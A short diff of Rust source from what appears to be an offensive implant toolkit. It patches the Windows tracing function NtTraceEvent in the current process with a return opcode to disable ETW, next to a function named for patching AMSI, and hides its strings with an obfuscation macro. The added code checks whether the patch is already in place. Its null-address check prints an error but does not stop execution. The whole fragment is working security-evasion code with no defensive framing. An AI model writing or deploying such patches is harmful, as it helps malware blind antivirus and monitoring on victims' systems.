@@ -99,10 +99,20 @@ pub fn patch_amsi_current_process() -> Result<(), ExportResolveError> {
 
 pub fn patch_etw_current_process() -> Result<(), ExportResolveError> {
     let fn_addr =
-        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?;
+        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?
+            as *mut c_void;
+
+    if fn_addr.is_null() {
+        print_failed(sc!("Error resolving NtTraceEvent, not patching ETW.", 95).unwrap());
+    }
 
     let handle = unsafe { GetCurrentProcess() };
     let ret_opcode: u8 = 0xC3;
+
+    // Have we already patched?
+    if unsafe { *(fn_addr as *mut u8) } == 0xC3 {
+        return Ok(());
+    }
 
     let size = std::mem::size_of_val(&ret_opcode);
     let mut bytes_written: usize = 0;
